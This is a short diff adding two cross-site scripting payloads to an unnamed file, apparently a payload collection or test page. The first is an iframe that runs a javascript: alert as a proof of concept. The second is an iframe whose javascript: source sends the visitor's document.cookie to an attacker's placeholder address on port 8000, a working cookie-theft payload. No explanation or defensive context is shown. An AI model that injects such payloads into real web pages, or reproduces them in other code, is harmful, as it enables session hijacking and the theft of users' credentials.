@@ -1,1 +1,4 @@
+<iframe src="javascript:alert('XSS Attack !')"></iframe>
+
+<iframe src="javascript:document.location='http://<your-ip>:8000?cookie=' + document.cookie"></iframe>
 
